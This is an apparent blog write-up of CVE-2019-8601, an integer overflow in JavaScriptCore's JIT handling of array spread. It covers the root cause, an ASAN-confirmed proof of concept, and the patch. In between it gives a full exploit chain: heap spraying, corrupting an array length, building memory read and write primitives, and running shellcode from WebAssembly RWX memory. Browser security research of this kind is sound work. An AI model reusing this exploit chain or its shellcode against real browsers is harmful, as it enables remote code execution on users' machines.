---
layout: post
title: JSC pwn cve-2019-8601 NewArrayWithSpread Integer overflow analysis
category: [browser]
tags: [browser]
---

To analysis the vulnerability, first compile the `asan` version of `jsc`.

```bash
svn checkout -r 240322 https://svn.webkit.org/repository/webkit/trunk webkit
Tools/Scripts/set-webkit-configuration --asan
Tools/Scripts/build-webkit --jsc-only --debug
```

## Analysis

### root cause

Before go into the vulnerable code, we need to get basic understanding of `Spread syntax (...)` in js. According to the [MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax), `Spread syntax (...)` allows an iterable such as an array expression or string to be expanded in places where zero or more arguments (for function calls) or elements (for array literals) are expected, or an object expression to be expanded in places where zero or more key-value pairs (for object literals) are expected.

```js
function sum(x, y, z) {
  return x + y + z;
}

const numbers = [1, 2, 3];

console.log(sum(...numbers));
// expected output: 6

function foo(arr) {
  return [...arr, ...arr];
}

console.log(foo(numbers));
// expected output [1, 2, 3, 1, 2, 3]
```

When we create a new array  `[...arr, ...arr]` in the upper funtion `foo` , it will generate bytecode `new_array_with_spread `, and if we jit compile that bytecode, it will generate `NewArrayWithSpread` DFG `IR`.

Now we can dive into the vulnerable code, let's see the `compileNewArrayWithSpread` function. It's responsible for generating the binary code for  `NewArrayWithSpread` DFG `IR`.

As we can see, the whole function can be separated three part:

1. The first part will try to calculate all the elements' count by adding the `length` together in `spread array`.
2. The second part will alloc space to store all the new array's element according to the total `length` in step `1`, by calling `compileAllocateNewArrayWithSize` function.
3. The third part will just copy all the elements to the new array with no `out-of-bound` check.

```c++
// JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 7997
void SpeculativeJIT::compileNewArrayWithSpread(Node* node)
{
    ASSERT(node->op() == NewArrayWithSpread);

#if USE(JSVALUE64)
    if (m_jit.graph().isWatchingHavingABadTimeWatchpoint(node)) {
        GPRTemporary result(this);
        GPRReg resultGPR = result.gpr();

        BitVector* bitVector = node->bitVector();
        {
            unsigned startLength = 0;
            ...

            GPRTemporary length(this);
            GPRReg lengthGPR = length.gpr();
            m_jit.move(TrustedImm32(startLength), lengthGPR);
						
          	// part 1 calculate the total length of array number.
            for (unsigned i = 0; i < node->numChildren(); ++i) {
                if (bitVector->get(i)) {
                    Edge use = m_jit.graph().varArgChild(node, i);
                    SpeculateCellOperand fixedArray(this, use);
                    GPRReg fixedArrayGPR = fixedArray.gpr();
                    speculationCheck(Overflow, JSValueRegs(), nullptr, m_jit.branchAdd32(MacroAssembler::Overflow, MacroAssembler::Address(fixedArrayGPR, JSFixedArray::offsetOfSize()), lengthGPR));
                }
            }

						
            bool shouldAllowForArrayStorageStructureForLargeArrays = false;
            ...
            // part 2 alloc the space to store the new array
            compileAllocateNewArrayWithSize(m_jit.graph().globalObjectFor(node->origin.semantic), resultGPR, lengthGPR, ArrayWithContiguous, shouldAllowForArrayStorageStructureForLargeArrays);
        }

        GPRTemporary index(this);
        GPRReg indexGPR = index.gpr();

        GPRTemporary storage(this);
        GPRReg storageGPR = storage.gpr();

        m_jit.move(TrustedImm32(0), indexGPR);
        m_jit.loadPtr(MacroAssembler::Address(resultGPR, JSObject::butterflyOffset()), storageGPR);
				
      	// part 3, just copy all the element in the separate array to the new array.
        for (unsigned i = 0; i < node->numChildren(); ++i) {
            Edge use = m_jit.graph().varArgChild(node, i);
            if (bitVector->get(i)) {
                SpeculateCellOperand fixedArray(this, use);
                GPRReg fixedArrayGPR = fixedArray.gpr();

                GPRTemporary fixedIndex(this);
                GPRReg fixedIndexGPR = fixedIndex.gpr();

                GPRTemporary item(this);
                GPRReg itemGPR = item.gpr();

                GPRTemporary fixedLength(this);
                GPRReg fixedLengthGPR = fixedLength.gpr();

                m_jit.load32(MacroAssembler::Address(fixedArrayGPR, JSFixedArray::offsetOfSize()), fixedLengthGPR);
                m_jit.move(TrustedImm32(0), fixedIndexGPR);
                auto done = m_jit.branchPtr(MacroAssembler::AboveOrEqual, fixedIndexGPR, fixedLengthGPR);
                auto loopStart = m_jit.label();
                m_jit.load64(
                    MacroAssembler::BaseIndex(fixedArrayGPR, fixedIndexGPR, MacroAssembler::TimesEight, JSFixedArray::offsetOfData()),
                    itemGPR);

                m_jit.store64(itemGPR, MacroAssembler::BaseIndex(storageGPR, indexGPR, MacroAssembler::TimesEight));
                m_jit.addPtr(TrustedImm32(1), fixedIndexGPR);
                m_jit.addPtr(TrustedImm32(1), indexGPR);
                m_jit.branchPtr(MacroAssembler::Below, fixedIndexGPR, fixedLengthGPR).linkTo(loopStart, &m_jit);

                done.link(&m_jit);
            ...
```

To figure the root cause of vulnerability, we need to check the code of part `1` and `2` again.  First it will generate the code that add all the child arrays' length together to the var `lengthGPR`. Note that there's a `overflow` check by calling `speculationCheck`, it's secure here.

```c++
						// part 1 calculate the total length of array number.
						// JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 8018
            for (unsigned i = 0; i < node->numChildren(); ++i) {
                if (bitVector->get(i)) {
                    Edge use = m_jit.graph().varArgChild(node, i);
                    SpeculateCellOperand fixedArray(this, use);
                    GPRReg fixedArrayGPR = fixedArray.gpr();
                    speculationCheck(Overflow, JSValueRegs(), nullptr, m_jit.branchAdd32(MacroAssembler::Overflow, MacroAssembler::Address(fixedArrayGPR, JSFixedArray::offsetOfSize()), lengthGPR));
                }
            }
```

When figure out the length of new array, it will generate the code to alloc `space` for storing the element.

```c++
						// JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 8028
						bool shouldAllowForArrayStorageStructureForLargeArrays = false;
            ...
            // part 2 alloc the space to store the new array
            compileAllocateNewArrayWithSize(m_jit.graph().globalObjectFor(node->origin.semantic), resultGPR, lengthGPR, ArrayWithContiguous, shouldAllowForArrayStorageStructureForLargeArrays);
```

Let's going to `compileAllocateNewArrayWithSize`, it will call `emitAllocateButterfly` function that generate the code to alloc the `butterfly` which is used to store the array elements.

```c++
// JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 13050
void SpeculativeJIT::compileAllocateNewArrayWithSize(JSGlobalObject* globalObject, GPRReg resultGPR, GPRReg sizeGPR, IndexingType indexingType, bool shouldConvertLargeSizeToArrayStorage)
{
    GPRTemporary storage(this);
    GPRTemporary scratch(this);
    GPRTemporary scratch2(this);

    GPRReg storageGPR = storage.gpr();
    GPRReg scratchGPR = scratch.gpr();
    GPRReg scratch2GPR = scratch2.gpr();

    m_jit.move(TrustedImmPtr(nullptr), storageGPR);

    MacroAssembler::JumpList slowCases;
    if (shouldConvertLargeSizeToArrayStorage)
        slowCases.append(m_jit.branch32(MacroAssembler::AboveOrEqual, sizeGPR, TrustedImm32(MIN_ARRAY_STORAGE_CONSTRUCTION_LENGTH)));

  	// alloc butterfly here.
    // We can use resultGPR as a scratch right now.
    emitAllocateButterfly(storageGPR, sizeGPR, scratchGPR, scratch2GPR, resultGPR, slowCases);

  	// alloc JSObject which is the new Array
  	...
    emitAllocateJSObject<JSArray>(resultGPR, TrustedImmPtr(structure), storageGPR, scratchGPR, scratch2GPR, slowCases);

    m_jit.mutatorFence(*m_jit.vm());
		
  	// slow patch here if bail out
    addSlowPathGenerator(std::make_unique<CallArrayAllocatorWithVariableSizeSlowPathGenerator>(
        slowCases, this, operationNewArrayWithSize, resultGPR,
        structure,
        shouldConvertLargeSizeToArrayStorage ? m_jit.graph().registerStructure(globalObject->arrayStructureForIndexingTypeDuringAllocation(ArrayWithArrayStorage)) : structure,
        sizeGPR, storageGPR));
}
```

The vulnerability is in the `emitAllocateButterfly`, the `butterfly` is used to store all the elements in the new array. We have got the `length` in `compileNewArrayWithSpread` function, but the whole memory `size` that the new array need should be `length*8`. As we can see, the `emitAllocateButterfly` function just do like we said, `lshift32(TrustedImm32(3), scratch1)` with the `length` and add the more space that needed, left shift `3` bit means `length*8`.

```c++
// JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 11696
void SpeculativeJIT::emitAllocateButterfly(GPRReg storageResultGPR, GPRReg sizeGPR, GPRReg scratch1, GPRReg scratch2, GPRReg scratch3, MacroAssembler::JumpList& slowCases)
{
    RELEASE_ASSERT(RegisterSet(storageResultGPR, sizeGPR, scratch1, scratch2, scratch3).numberOfSetGPRs() == 5);
    ASSERT((1 << 3) == sizeof(JSValue));
    m_jit.zeroExtend32ToPtr(sizeGPR, scratch1);
    m_jit.lshift32(TrustedImm32(3), scratch1);
    m_jit.add32(TrustedImm32(sizeof(IndexingHeader)), scratch1, scratch2);
    m_jit.emitAllocateVariableSized(
        storageResultGPR, m_jit.vm()->jsValueGigacageAuxiliarySpace, scratch2, scratch1, scratch3, slowCases);
    m_jit.addPtr(TrustedImm32(sizeof(IndexingHeader)), storageResultGPR);

    m_jit.store32(sizeGPR, MacroAssembler::Address(storageResultGPR, Butterfly::offsetOfPublicLength()));
    m_jit.store32(sizeGPR, MacroAssembler::Address(storageResultGPR, Butterfly::offsetOfVectorLength()));
}
```

We need to point out that there is no `overflow` check here, though there are `overflow` check with `length` calculation, but it just forget the `overflow` check in calculating the total memory `size`, so there is a `integer overflow` vulnerability  here.

For example, if there the total `length` of the new array is `0x20000001`, then the total size will be `(0x20000001<<3)&0xffffffff`, which is just `8`. When malloc out the space, it will copy all the elements to the new array, so forms a `out-of-bound write` vulnerability.

### build poc

We've understand the root cause of the vulnerability, now we need to build the `poc` to trigger the bug.

Before trying to build the poc, i need to explain why i compile the `asan` version first. The reason is that this is a  `out-of-bound write` vulnerability, if we don't go with `asan` version, we may be not aware that the bug has been trigged. However, it will goes error directly, if we trigger the bug in `asan` version.

The first version of `poc` should be like below:

```js
const MAX_ITERATIONS = 0x2000;

function foo(arr)
{
    return [...arr]
}

let arr = [1.1];
for(let i=0; i<MAX_ITERATIONS; i++) {
    foo(arr)
}

let a = new Array(0x20000001)                                                                  

a.fill(1.1)

foo(a)
```

when we run the `poc`, it just report the `SIGKILL`. Check the reason with `dmesg`, we can see that it causes a `oom` error here, which means that we can't alloc the array with `0x20000001` here.

```bash
$ ~/work/browser/webkit_svn/WebKitBuild/Debug/bin/jsc poc.js

[1]    96975 killed     ~/work/browser/webkit_svn/WebKitBuild/Debug/bin/jsc poc.js

$ dmesg
[143339.385393] oom-kill:constraint=CONSTRAINT_NONE,nodemask=(null),cpuset=/,mems_allowed=0,global_oom,task_memcg=/user.slice/user-1000.slice/session-2.scope,task=jsc,pid=96975,uid=1000
[143339.385436] Out of memory: Killed process 96975 (jsc) total-vm:91714004kB, anon-rss:7261120kB, file-rss:0kB, shmem-rss:0kB, UID:1000 pgtables:25976kB oom_score_adj:0
[143339.560176] oom_reaper: reaped process 96975 (jsc), now anon-rss:0kB, file-rss:0kB, shmem-rss:0kB
```

How to do? We can split the big array to some smaller arrays but with more `spread` to concat them together. With this idea, we can build the `poc` as below:

```js
const MAX_ITERATIONS = 0x2000;

function foo(arr)
{
    return [...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr]
}

let arr = [1.1];
for(let i=0; i<MAX_ITERATIONS; i++) {
    foo(arr)
}

let a = new Array(0x2000001)                                                                  

a.fill(1.1)

foo(a)
```

It goes with a `abort` error.

```bash
$ ~/work/browser/webkit_svn/WebKitBuild/Debug/bin/jsc 2.js
WARNING: ASAN interferes with JSC signal handlers; useWebAssemblyFastMemory will be disabled.
ASSERTION FAILED: result
../../Source/JavaScriptCore/runtime/JSArray.h(276) : static JSC::JSArray* JSC::JSArray::create(JSC::VM&, JSC::Structure*, unsigned int)
[1]    97300 abort (core dumped)  ~/work/browser/webkit_svn/WebKitBuild/Debug/bin/jsc 2.js
```

check in gdb, we can see that it goes `operationNewArrayWithSize` bytecode handler. It seems that the jit code funtion has been bailed out to interpreter.

```bash
pwndbg> bt
#0  __GI_raise (sig=sig@entry=0x6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff37ec859 in __GI_abort () at abort.c:79
#2  0x00007ffff617ccce in JSC::JSArray::create (vm=..., structure=0x7fffb03f2a00, initialLength=0x20000010) at ../../Source/JavaScriptCore/runtime/JSArray.h:276
#3  0x00007ffff6154a79 in JSC::DFG::operationNewArrayWithSize (exec=0x7fffffffd200, arrayStructure=0x7fffb03f2a00, size=0x20000010, butterfly=0x0) at ../../Source/JavaScriptCore/dfg/DFGOperations.cpp:1644
#4
```

Go back to see `compileAllocateNewArrayWithSize`, we can see it will actually go to the `operationNewArrayWithSize` bytecode handler when trigger the slow case.

```c++
// JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 13050
void SpeculativeJIT::compileAllocateNewArrayWithSize(JSGlobalObject* globalObject, GPRReg resultGPR, GPRReg sizeGPR, IndexingType indexingType, bool shouldConvertLargeSizeToArrayStorage)
{
    GPRTemporary storage(this);
    GPRTemporary scratch(this);
    GPRTemporary scratch2(this);

    GPRReg storageGPR = storage.gpr();
    GPRReg scratchGPR = scratch.gpr();
    GPRReg scratch2GPR = scratch2.gpr();

    m_jit.move(TrustedImmPtr(nullptr), storageGPR);

    MacroAssembler::JumpList slowCases;
    if (shouldConvertLargeSizeToArrayStorage)
        slowCases.append(m_jit.branch32(MacroAssembler::AboveOrEqual, sizeGPR, TrustedImm32(MIN_ARRAY_STORAGE_CONSTRUCTION_LENGTH)));

  	// alloc butterfly here.
    // We can use resultGPR as a scratch right now.
    emitAllocateButterfly(storageGPR, sizeGPR, scratchGPR, scratch2GPR, resultGPR, slowCases);

  	// alloc JSObject which is the new Array
  	...
    emitAllocateJSObject<JSArray>(resultGPR, TrustedImmPtr(structure), storageGPR, scratchGPR, scratch2GPR, slowCases);

    m_jit.mutatorFence(*m_jit.vm());
		
  	// slow patch here if bail out
    addSlowPathGenerator(std::make_unique<CallArrayAllocatorWithVariableSizeSlowPathGenerator>(
        slowCases, this, operationNewArrayWithSize, resultGPR,
        structure,
        shouldConvertLargeSizeToArrayStorage ? m_jit.graph().registerStructure(globalObject->arrayStructureForIndexingTypeDuringAllocation(ArrayWithArrayStorage)) : structure,
        sizeGPR, storageGPR));
}
```

so we need to figure out where we trigger the `slowCases`,  the first is if `shouldConvertLargeSizeToArrayStorage` is set to `true`, it will append the `slow case`. But in `compileNewArrayWithSpread` function, the var has been set to `false`, so it's not here.

```c++
    // JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 13063
    if (shouldConvertLargeSizeToArrayStorage)
        slowCases.append(m_jit.branch32(MacroAssembler::AboveOrEqual, sizeGPR, TrustedImm32(MIN_ARRAY_STORAGE_CONSTRUCTION_LENGTH)));

						// JavaScriptCore/dfg/DFGSpeculativeJIT.cpp: 8028
						bool shouldAllowForArrayStorageStructureForLargeArrays = false;
            ...
            // part 2 alloc the space to store the new array
            compileAllocateNewArrayWithSize(m_jit.graph().globalObjectFor(node->origin.semantic), resultGPR, lengthGPR, ArrayWithContiguous, shouldAllowForArrayStorageStructureForLargeArrays);
```

Next it's in `emitAllocateButterfly` and `emitAllocateJSObject`, 

```c++
 		// We can use resultGPR as a scratch right now.
    emitAllocateButterfly(storageGPR, sizeGPR, scratchGPR, scratch2GPR, resultGPR, slowCases);

  	// alloc JSObject which is the new Array
  	...
    emitAllocateJSObject<JSArray>(resultGPR, TrustedImmPtr(structure), storageGPR, scratchGPR, scratch2GPR, slowCases);
```

In `emitAllocateJSObject`, it will finally call `emitAllocateWithNonNullAllocator` funciton.

```c++
    // JavaScriptCore/jit/AssemblyHelper.h: 1744
		void emitAllocateJSObject(GPRReg resultGPR, const JITAllocator& allocator, GPRReg allocatorGPR, StructureType structure, StorageType storage, GPRReg scratchGPR, JumpList& slowPath)
    {
        emitAllocateJSCell(resultGPR, allocator, allocatorGPR, structure, scratchGPR, slowPath);
        storePtr(storage, Address(resultGPR, JSObject::butterflyOffset()));
    }
		
		// JavaScriptCore/jit/AssemblyHelper.h: 1736
		template<typename StructureType>
    void emitAllocateJSCell(GPRReg resultGPR, const JITAllocator& allocator, GPRReg allocatorGPR, StructureType structure, GPRReg scratchGPR, JumpList& slowPath)
    {
        emitAllocate(resultGPR, allocator, allocatorGPR, scratchGPR, slowPath);
        emitStoreStructureWithTypeInfo(structure, resultGPR, scratchGPR);
    }

// JavaScriptCore/jit/AssemblyHelper.cpp: 541
void AssemblyHelpers::emitAllocate(GPRReg resultGPR, const JITAllocator& allocator, GPRReg allocatorGPR, GPRReg scratchGPR, JumpList& slowPath)
{
    if (allocator.isConstant()) {
        if (!allocator.allocator()) {
            slowPath.append(jump());
            return;
        }
    } else
        slowPath.append(branchTestPtr(Zero, allocatorGPR));
    emitAllocateWithNonNullAllocator(resultGPR, allocator, allocatorGPR, scratchGPR, slowPath);
}
```

Follow into the `emitAllocateWithNonNullAllocator` function, we can see that if  there is no space for allocator, then it will to to the `slow path`. It may alloc too many space in the `0x10 spread` array, and there is no space left for the `JSObject`.

```c++
// JavaScriptCore/jit/AssemblyHelper.cpp: 494
void AssemblyHelpers::emitAllocateWithNonNullAllocator(GPRReg resultGPR, const JITAllocator& allocator, GPRReg allocatorGPR, GPRReg scratchGPR, JumpList& slowPath)
{
    if (Options::forceGCSlowPaths()) {
        slowPath.append(jump());
        return;
    }

    // NOTE, some invariants of this function:
    // - When going to the slow path, we must leave resultGPR with zero in it.
    // - We *can not* use RegisterSet::macroScratchRegisters on x86.
    // - We *can* use RegisterSet::macroScratchRegisters on ARM.

    Jump popPath;
    Jump done;
    
    if (allocator.isConstant())
        move(TrustedImmPtr(allocator.allocator().localAllocator()), allocatorGPR);

    load32(Address(allocatorGPR, LocalAllocator::offsetOfFreeList() + FreeList::offsetOfRemaining()), resultGPR);
    popPath = branchTest32(Zero, resultGPR);
    if (allocator.isConstant())
        add32(TrustedImm32(-allocator.allocator().cellSize()), resultGPR, scratchGPR);
    else {
        move(resultGPR, scratchGPR);
        sub32(Address(allocatorGPR, LocalAllocator::offsetOfCellSize()), scratchGPR);
    }
    negPtr(resultGPR);
    store32(scratchGPR, Address(allocatorGPR, LocalAllocator::offsetOfFreeList() + FreeList::offsetOfRemaining()));
    Address payloadEndAddr = Address(allocatorGPR, LocalAllocator::offsetOfFreeList() + FreeList::offsetOfPayloadEnd());
    addPtr(payloadEndAddr, resultGPR);

    done = jump();
        
    popPath.link(this);
        
    loadPtr(Address(allocatorGPR, LocalAllocator::offsetOfFreeList() + FreeList::offsetOfScrambledHead()), resultGPR);
    xorPtr(Address(allocatorGPR, LocalAllocator::offsetOfFreeList() + FreeList::offsetOfSecret()), resultGPR);
    slowPath.append(branchTestPtr(Zero, resultGPR));
        
    // The object is half-allocated: we have what we know is a fresh object, but
    // it's still on the GC's free list.
    loadPtr(Address(resultGPR), scratchGPR);
    storePtr(scratchGPR, Address(allocatorGPR, LocalAllocator::offsetOfFreeList() + FreeList::offsetOfScrambledHead()));
        
    done.link(this);
}
```

According to the `BadAccess11`'s [wp](https://github.com/BadAccess11/CVE-2019-8601), that's the reason why the jit function bails out. The solution is that add  callback at the last `spread`, which add a small `Array`. In this case it will trigger `gc`, and the jit code won't go to the `slow path` again, the poc is shown as below:

```js
const MAX_ITERATIONS = 0x2000;

function foo(arr, helper)
{
    return [...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...arr, ...helper]
}

let arr = [1.1];
for(let i=0; i<MAX_ITERATIONS; i++) {
    foo(arr, arr)
}

let evil_arr = new Array(0x2000001)                                                                  

evil_arr.fill(1.1)

let helper = [];
helper.length = 1;

helper.__defineGetter__(0, () => {
    let x = new Array(0x10);
})

foo(evil_arr, helper);

```

Finally, we can successfully trigger the bug.

```bash
$ ~/work/browser/webkit_svn/WebKitBuild/Debug/bin/jsc poc.js
WARNING: ASAN interferes with JSC signal handlers; useWebAssemblyFastMemory will be disabled.
AddressSanitizer:DEADLYSIGNAL
=================================================================
==97842==ERROR: AddressSanitizer: SEGV on unknown address 0x62d1000bbdc8 (pc 0x7f7801cffaeb bp 0x7ffe2b4a1e30 sp 0x7ffe2b4a1d80 T0)
==97842==The signal is caused by a WRITE memory access.
    #0 0x7f7801cffaea  (<unknown module>)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (<unknown module>)
==97842==ABORTING
```

Actually, i don't know the reason why a small callback can successfully bypass the `slow path` clearly, just follow the explanation in  `BadAccess11`'s [wp](https://github.com/BadAccess11/CVE-2019-8601), if anybody knows why, please tell me. Also if i learn more about the `WebKit allocator` and figure out why, i'll go back to here to explain clearly.

## exploit

The exploit is a little complicated.

Now we can trigger the vulnerability, to exploit it we need to compile the `no asan` version first.

```bash
Tools/Scripts/set-webkit-configuration --no-asan
Tools/Scripts/build-webkit --jsc-only --debug
```

In the poc, we can trigger a heap out-of-bound write. According to the previous experience, our target is to build `addr_of`, `fake_obj`, `aaw` and  `aar` primitives.

First thing we need to do is that build a heap layout, and trigger the heap overflow to write the `length` field of the `victim` array. The key code is shown as below, first create a `float` array and a `object` array. In the `helper` callback function, `spray` the `float_arr` and `obj_arr`, this will form the `obj_arr`'s memory is next to the `float_arr`'s memory. At last we trigger the vulnerability, it will overwrite the `evil_val` to the `float_arr` and `obj_arr`'s memory.

```js
let evil = [];

let len = 0x20000010 / 0x10;

// evil_val will overwrite the float_arr's length field
let evil_val = i2f(0x202000002020);
for(let i = 0; i < len; i++){
  evil[i] = evil_val;
}


let helper = []; 
helper.length = 1;

let spray_arr = new Array(0x8000);
let float_arr = new Array(0x10);
float_arr.fill(1.1);
let obj_arr = new Array(0x10);
obj_arr.fill({});
// print(describe(float_arr));
// print(describe(obj_arr));

helper.__defineGetter__(0, () => {
    for(let i=0; i<0x8000; i+=2) {
        // deploy heap layout behind the spread object
        spray_arr[i] = float_arr.slice();
        spray_arr[i+1] = obj_arr.slice();
    }
})

// trigger vuln
foo(evil, helper);

```

Specifically, it will write `0x202000002020`  to the `length` field of `float_arr`. If so, we get a `oob_arr` here. 

```js
// find out the float_arr that length has been overwritten
let oob_idx = -1;
let oob_arr = undefined;
for(let i=0; i<spray_arr.length; i+=2) {
    if(spray_arr[i].length == 0x2020){
        oob_idx = i;
        oob_arr = spray_arr[i];
        obj_arr = spray_arr[i+1];
        break;
    }
}

if(oob_idx == -1) {
    throw("trigger vuln failed");
}
// print(describe(oob_arr));
// print(describe(obj_arr));
print("oob arr length: "+hex(oob_arr.length));

// find out the next obj_arr idx by oob_arr
let obj_idx = -1;
obj_arr[0] = i2obj(0x10000deadbeef);
for(let i=0; i<0x100; i++) {
    if(oob_arr[i] != i2f(0x1202000002020) && oob_arr[i] == i2f(0x10000deadbeef)) {
        obj_idx = i;
        // print(hex(f2i(oob_arr[i])));
        break;
    }
}
if(obj_idx == -1) {
    throw("find obj offset in oob arr failed");
}
print("obj in oob arr offset: "+hex(obj_idx));
```

Once we get the `oob_arr`, for that `obj_arr` is next to the `oob_arr`, so we can build `fake_obj` and `addr_of` primitives directly with `oob_arr`.

```js
// addr_of primitive
function addr_of(obj)
{
    obj_arr[0] = obj;
    return f2i(oob_arr[obj_idx]);
}

// fake_obj primitive
function fake_obj(addr)
{
    val = i2f(addr)
    oob_arr[obj_idx] = val;
    return obj_arr[0];
}
```

After getting the `addr_of` and `fake_obj` primitives, we can finish the exploit easily follow the LiveOverflow's series vedio [Browser Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t):

1. `spray` the `structure id`:

   ```js
   var structure_spray = [];
   // spray the structure id
   for(let i=0; i<0x2000; i++) {
       arr = [13.37];
       arr['prop'] = 13.37;
       arr['prop_'+i] = 13.37;
       structure_spray.push(arr);
   }
   ```

2. build fake object `driver`:

   ```js
   // ArrayWithDouble cell
   var double_cell_header = 0x0108200700000200;
   // 0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
   // 0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
   // 0x20,                                  // m_type (ArrayType)gu
   // 0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
   // 0x1                                    // m_cellState (DefinitelyWhite)
   
   // ArrayWithContiguous cell
   var contiguous_cell_header = 0x0108200900000200;
   // 0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
   // 0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
   // 0x20,                                  // m_type (ArrayType)
   // 0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
   // 0x1                                    // m_cellState (DefinitelyWhite)
   
   // container to store fake driver object
   var container = {
       cell_header: i2f(contiguous_cell_header-0x01000000000000),
       butterfly: victim
   };
   
   var container_addr = addr_of(container);
   var fake_arr_addr = container_addr + 0x10;
   print("[+] fake driver object addr: "+hex(fake_arr_addr));
   var driver = fake_obj(fake_arr_addr);
   ```

3. get the overlap memory:

   ```js
   // ArrayWithContiguous
   var boxed = [{}];
   // ArrayWithDouble
   var unboxed = [13.37, 13.37];
   
   driver[1] = unboxed;
   // print(describe(driver));
   var shared_butterfly = f2i(victim[1]);
   print("[+] shared butterfly addr: " + hex(shared_butterfly));
   driver[1] = boxed;
   victim[1] = i2f(shared_butterfly);
   
   container.cell_header = i2f(double_cell_header-0x01000000000000);
   ```

4. get all the 4 primitives:

   ```js
   // get all the primitives
   primitives = {
       addr_of: function(obj) {
           boxed[0] = obj;
           return f2i(unboxed[0]);
       },
   
       fake_obj: function(addr) {
           unboxed[0] = i2f(addr);
           return boxed[0];
       },
   
           read64: function(addr) {
                   driver[1] = i2f(addr+0x10);
           return this.addr_of(victim.prop);
           },
       write64: function(addr, val) {
           driver[1] = i2f(addr+0x10);
           // victim.prop = this.fake_obj(val);
           victim.prop = i2f(val);//this.fake_obj(val);
       }
   
   }
   ```

5. Then write shellcode to `wasm` object's `rwx` memory and tirgger the `wasm` funtion.

   ```js
   let wasm_obj_addr = primitives.addr_of(wasm_obj);
   print("[+] wasm object addr: "+hex(wasm_obj_addr));
   // print(describe(wasm_obj));
   // leak rwx addr
   // let rwx_addr = read64(code_addr);
   let rwx_addr = primitives.read64(wasm_obj_addr + 0x30);
   print("[+] rwx addr: " + hex(rwx_addr));
   var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
       96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
       105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
       72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
       72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
       184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
       94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
   
   // write shellcode to rwx addr
   arbitrary_write(rwx_addr, shellcode);
   print("[+] trigger shellcode");
   // trigger wasm function
   wasm_obj();
   ```

Pwned!

![calc](https://raw.githubusercontent.com/r1mit/r1mit.github.io/main/_imgs/calc.png)

## Patch

It's a pity that i can't find the patch commit. I just go to check the latest code of `jsc` to figure out how to patch this vulnerability. 

The code is shown as below, we can see that after calculate the `length`, there is a `overflow` check for `lengthGPR`, it can't `AboveOrEqual MIN_ARRAY_STORAGE_CONSTRUCTION_LENGTH` which is `1024 * 1024 * 1024 / 8`, so the `integer overflow` is disappeared.

```c++
void SpeculativeJIT::compileNewArrayWithSpread(Node* node)
{
    ...
            GPRReg lengthGPR = length.gpr();
            m_jit.move(TrustedImm32(startLength), lengthGPR);

            for (unsigned i = 0; i < node->numChildren(); ++i) {
                if (bitVector->get(i)) {
                    Edge use = m_jit.graph().varArgChild(node, i);
                    SpeculateCellOperand immutableButterfly(this, use);
                    GPRReg immutableButterflyGPR = immutableButterfly.gpr();
                    speculationCheck(Overflow, JSValueRegs(), nullptr, m_jit.branchAdd32(MacroAssembler::Overflow, MacroAssembler::Address(immutableButterflyGPR, JSImmutableButterfly::offsetOfPublicLength()), lengthGPR));
                }
            }

            speculationCheck(Overflow, JSValueRegs(), nullptr, m_jit.branch32(MacroAssembler::AboveOrEqual, lengthGPR, TrustedImm32(MIN_ARRAY_STORAGE_CONSTRUCTION_LENGTH)));

            // We can tell compileAllocateNewArrayWithSize() that it does not need to
            // check for large arrays and use ArrayStorage structure because we already
            // ensured above that the spread array length will definitely fit in a
            // non-ArrayStorage shaped array.
            bool shouldAllowForArrayStorageStructureForLargeArrays = false;
            compileAllocateNewArrayWithSize(globalObject, resultGPR, lengthGPR, ArrayWithContiguous, shouldAllowForArrayStorageStructureForLargeArrays);
        }
```

## conclusion

`cve-2019-8601` is a `integer overflow` problem when generating the `jit` code, it's unlike the usual `side effect` vulnerabilities. Analysis this exploit makes me know more about `DFG` compiler.

 

## reference

* [Exploiting CVE-2019-8601](https://github.com/BadAccess11/CVE-2019-8601)
* [Spread syntax (...)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax)
* [DIVING DEEP INTO A PWN2OWN WINNING WEBKIT BUG](https://www.zerodayinitiative.com/blog/2019/11/25/diving-deep-into-a-pwn2own-winning-webkit-bug)



